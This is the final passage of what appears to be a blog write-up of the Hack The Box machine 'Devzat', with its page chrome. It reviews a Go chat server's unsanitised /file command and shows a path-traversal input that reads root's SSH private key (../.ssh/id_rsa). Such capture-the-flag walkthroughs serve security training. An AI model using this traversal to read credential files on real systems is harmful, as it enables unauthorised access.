			<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Something went wrong printing the file: %+v"</span><span class="p">,</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">()))</span>
		<span class="p">}</span>

		<span class="k">return</span>

	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">IsNotExist</span><span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
		<span class="c">// does not exist, print error</span>
		<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"The requested file @ %+v does not exist!"</span><span class="p">,</span> <span class="n">printPath</span><span class="p">))</span>
		<span class="k">return</span>
	<span class="p">}</span>
	<span class="c">// bokred?</span>
	<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"Something went badly wrong."</span><span class="p">)</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">clearCommand</span><span class="p">(</span><span class="n">u</span> <span class="o">*</span><span class="n">user</span><span class="p">,</span> <span class="n">_</span> <span class="p">[]</span><span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">u</span><span class="o">.</span><span class="n">term</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"</span><span class="err">\0</span><span class="s">33[H</span><span class="err">\0</span><span class="s">33[2J"</span><span class="p">))</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This source code shows that this command takes 2 arguments “file path” and “password” and there is no sanitization in the input. Another thing is that file path construct with 2 fields application’s working directory + user input file path.</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>	<span class="c">// Get CWD</span>
	<span class="n">cwd</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Getwd</span><span class="p">()</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
	<span class="p">}</span>

	<span class="c">// Construct path to print</span>
	<span class="n">printPath</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</pre></table></code></div></div><p>And application’s working directory is <code class="language-plaintext highlighter-rouge">/root/devzat/</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>dev: /file <span class="nb">test </span>CeilingCatStillAThingIn2021?
<span class="o">[</span>SYSTEM] The requested file @ /root/devzat/test does not exist!
</pre></table></code></div></div><p>this is kind of a lfi bug where <code class="language-plaintext highlighter-rouge">../</code> lead to file inclusion.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
</pre></table></code></div></div><p><img data-src="/assets/img/posts/devzat/rooted.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command injection</a> <a href="/tags/influxdb-version-1-7-5/" class="post-tag no-text-decoration" >influxdb version 1.7.5</a> <a href="/tags/cve-2019-20933/" class="post-tag no-text-decoration" >cve-2019-20933</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Devzat - Poorduck&amp;url=https://x00tex.github.io/posts/devzat/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Devzat - Poorduck&amp;u=https://x00tex.github.io/posts/devzat/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/devzat/&amp;text=Hackthebox - Devzat - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/unicode/"><div class="card-body"> <em class="timeago small" data-ts="1638383400" > 2021-12-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unicode</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.126 hackmedia.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux...</p></div></div></a></div><div class="card"> <a href="/posts/pikaboo/"><div class="card-body"> <em class="timeago small" data-ts="1639161000" > 2021-12-10 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Pikaboo</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.10.249 pikaboo.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 1...</p></div></div></a></div><div class="card"> <a href="/posts/writer/"><div class="card-body"> <em class="timeago small" data-ts="1639420200" > 2021-12-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Writer</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.101 writer.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/secret/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Secret</p></a> <a href="/posts/intelligence/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Intelligence</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
